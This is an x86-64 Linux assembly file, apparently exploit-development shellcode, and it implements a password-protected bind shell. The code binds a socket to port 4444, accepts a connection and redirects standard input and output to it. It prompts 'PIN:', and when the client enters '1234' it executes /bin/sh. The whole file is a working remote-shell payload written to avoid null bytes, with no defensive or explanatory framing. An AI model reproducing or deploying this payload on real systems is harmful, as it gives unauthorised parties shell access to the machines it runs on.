global _start
section .text

_start:


socket:
	xor rdi, rdi
	add rdi, 2
	xor rsi, rsi
	add rsi, 1
	xor rdx, rdx
	xor rax, rax
	add rax, 41
	syscall

copysocket:
	mov rdi, rax
	xor rax, rax

server_struct:
	push rax                         ;bzero(&server.sin_zero, 8)
	mov dword [rsp-4], eax           ;server.sin_addr.s_addr=IN_ADDR_ANY 4 bytes
	mov word [rsp-6], 0x5c11         ;server.sin_port= 4444 (0x115c) 2 bytes
	mov word [rsp-8], 0x2            ;server.sin_family=AF_INET, 2bytes
	sub rsp, 8                       ;adjusting the stack pointer to point to the start of the struct

bind:
	;rdi is already equal to fd
	mov rsi, rsp
	mov dl, 16
	add rax, 49
	syscall

listen:
	;int listen(int sockfd, int backlog);
	;rdi is already set
	xor rsi, rsi
	mov sil, 2
	mov al, 50
	syscall

accept:
	;new = int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags)
	;rdi is already set
	sub rsp, 16
	mov rsi, rsp
	mov byte [rsp-1], 16
	sub rsp, 1
	mov rdx, rsp

	mov al, 43
	syscall

	mov r9, rax

close:
	xor rax, rax
	add rax, 0x3
	syscall

duplicate_sockets:
	;dup(new,old)
	mov rdi, r9
	xor rsi, rsi
	xor rax, rax
	mov al, 33
	syscall

	mov sil, 1
	mov al, 33
	syscall

	mov sil, 2
	mov al, 33
	syscall

write:
	;ssize_t write(int fd, const void *buf, size_t count);

	;xor rdi, rdi
	;mov rdi, 0x1
		

	xor rdx, rdx
	add rdx, 0x6

	xor rsi, rsi
	push rsi
	mov rsi, 0x3a4e4950
	push rsi
	mov rsi, rsp

	mov rax, 0x1
	syscall

;read:
	;ssize_t read(int fd, void *buf, size_t count);
	sub rsp, 4
	mov rsi, rsp
	
	xor rdx, rdx
	add rdx, 0x4

	xor rax, rax
	syscall

cmpinput:
	xor rbx, rbx
	mov bl, byte [rsp]
	xor rcx, rcx
	mov rcx, 0x31
	cmp rbx, rcx
	jne exit

	mov bl, byte [rsp+1]
	mov rcx, 0x32
	cmp rbx, rcx
	jne exit

	mov bl, byte [rsp+2]
	mov rcx, 0x33
        cmp rbx, rcx
        jne exit

	mov bl, byte [rsp+3]
	mov rcx, 0x34
        cmp rbx, rcx
        je execve

exit:
        xor rdi, rdi
        xor rax, rax
        add rax, 60
        syscall

execve:
	;int execve(const char *filename, char *const argv[], char *const envp[]);
	xor rdi, rdi
	xor rax,rax
	push rax
	
	mov rbx, 0x68732f6e69622f
	push rbx
	mov rdi, rsp

	push rax
	mov rdx, rsp

	push rdi
	mov rsi, rsp

	add rax, 59
	syscall
